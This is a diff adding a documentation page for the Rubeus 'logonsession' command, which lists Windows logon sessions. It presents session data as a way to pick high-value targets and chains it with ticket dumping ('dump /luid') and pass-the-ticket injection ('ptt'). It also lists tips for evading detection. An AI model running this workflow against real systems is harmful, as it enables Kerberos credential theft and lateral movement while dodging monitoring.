@@ -1,0 +1,206 @@
+---
+title: 'logonsession'
+description: 'Enumerate all logon sessions on the system'
+icon: 'users'
+sidebarTitle: 'logonsession'
+---
+
+## Overview
+
+Enumerate all logon sessions currently active on the system. This command provides detailed information about each session including user identity, logon type, and session characteristics for targeting and operational planning.
+
+## Syntax
+
+```bash
+Rubeus.exe logonsession [options]
+```
+
+## Optional Parameters
+
+<ParamField path="luid" type="string">
+  Display information for specific LUID only
+</ParamField>
+
+## Examples
+
+<CodeGroup>
+```bash Basic Enumeration
+# List all logon sessions
+Rubeus.exe logonsession
+
+# Display specific session details
+Rubeus.exe logonsession /luid:0x12345
+```
+</CodeGroup>
+
+## Session Information
+
+<Accordion title="Displayed Details">
+  **Session Attributes:**
+  - LUID (Logon Session Identifier)
+  - Username and domain
+  - Logon type and time
+  - Authentication package
+  - Session state and characteristics
+
+  **Logon Types:**
+  - 2: Interactive (console logon)
+  - 3: Network (remote authentication)
+  - 4: Batch (scheduled task)
+  - 5: Service (service account)
+  - 7: Unlock (workstation unlock)
+  - 8: NetworkCleartext (IIS authentication)
+  - 9: NewCredentials (RunAs with /netonly)
+  - 10: RemoteInteractive (RDP/Terminal Services)
+  - 11: CachedInteractive (cached domain credentials)
+</Accordion>
+
+## Use Cases
+
+<Accordion title="Session Analysis">
+  **Target Identification:**
+  - Find high-privilege user sessions
+  - Identify administrative logons
+  - Locate service account sessions
+  - Map user activity patterns
+
+  **Operational Planning:**
+  - Plan cross-session ticket operations
+  - Identify accessible session contexts
+  - Target specific user sessions
+  - Assess system security posture
+</Accordion>
+
+<Accordion title="Session Targeting">
+  **High-Value Sessions:**
+  - Domain administrator sessions
+  - Service account sessions with delegation
+  - Interactive administrative sessions
+  - Recent authentication activities
+
+  **Session Characteristics:**
+  - Session age and activity
+  - Authentication package used
+  - Network vs. interactive sessions
+  - Cached vs. live authentication
+</Accordion>
+
+## Output Analysis
+
+<Accordion title="Understanding Results">
+  **Sample Output:**
+  ```bash
+  Rubeus.exe logonsession
+
+  [*] Action: Enumerate Logon Sessions
+
+  [*] Logon Sessions:
+
+  LUID                 : 0x3e7 (999)
+  UserName             : 
+  Domain               : 
+  LogonType            : 0 (System)
+  AuthenticationPackage: 
+  LogonTime            : 1/1/1601 12:00:00 AM
+  LogonServer          : 
+  LogonServerDNSDomain : 
+  UserPrincipalName    : 
+
+  LUID                 : 0x54321 (344865)
+  UserName             : admin
+  Domain               : CORP
+  LogonType            : 10 (RemoteInteractive)
+  AuthenticationPackage: Kerberos
+  LogonTime            : 10/25/2024 9:15:30 AM
+  LogonServer          : DC01
+  LogonServerDNSDomain : corp.local
+  UserPrincipalName    : admin@corp.local
+  ```
+
+  **Key Elements:**
+  - LUID identifies session for targeting
+  - LogonType indicates session characteristics
+  - AuthenticationPackage shows credential type
+  - Recent LogonTime indicates active sessions
+</Accordion>
+
+## Integration Workflows
+
+<Accordion title="Session Discovery and Targeting">
+  **Complete Workflow:**
+  ```bash
+  # 1. Enumerate all sessions
+  Rubeus.exe logonsession
+
+  # 2. Identify high-value targets
+  # Look for admin users, recent logons, Kerberos auth
+
+  # 3. Target specific sessions
+  Rubeus.exe dump /luid:0x54321
+
+  # 4. Use extracted credentials
+  Rubeus.exe ptt /ticket:extracted.kirbi
+  ```
+</Accordion>
+
+<Accordion title="Cross-Session Operations">
+  **Multi-Session Analysis:**
+  ```bash
+  # 1. Map all active sessions
+  Rubeus.exe logonsession
+
+  # 2. Check current session context
+  Rubeus.exe currentluid
+
+  # 3. Plan cross-session ticket injection
+  Rubeus.exe ptt /ticket:admin.kirbi /luid:target_luid
+
+  # 4. Verify injection success
+  Rubeus.exe klist /luid:target_luid
+  ```
+</Accordion>
+
+## Session Types Analysis
+
+<Accordion title="Logon Type Significance">
+  **Interactive Sessions (2, 7, 10, 11):**
+  - User actively logged in
+  - Likely to have cached credentials
+  - May have elevated privileges
+  - Good targets for credential extraction
+
+  **Network Sessions (3, 8):**
+  - Remote authentication only
+  - May have limited cached credentials
+  - Useful for understanding network access
+  - May indicate lateral movement
+
+  **Service Sessions (4, 5):**
+  - Automated service accounts
+  - Often have delegation rights
+  - May run with high privileges
+  - Good targets for persistence
+</Accordion>
+
+## Operational Security
+
+<Accordion title="Detection Considerations">
+  **Monitoring Indicators:**
+  - Process accessing LSA session information
+  - Enumeration of multiple logon sessions
+  - Correlation with other suspicious activities
+  - Unusual session analysis patterns
+
+  **Evasion Strategies:**
+  - Limit frequency of enumeration
+  - Focus on specific high-value sessions
+  - Use during normal business hours
+  - Correlate with legitimate activities
+</Accordion>
+
+## Related Commands
+
+- [`currentluid`](/commands/miscellaneous/currentluid) - Display current session LUID
+- [`dump`](/commands/extraction/dump) - Extract tickets from specific sessions
+- [`ptt`](/commands/management/ptt) - Inject tickets into specific sessions
+- [`triage`](/commands/extraction/triage) - Quick session ticket overview
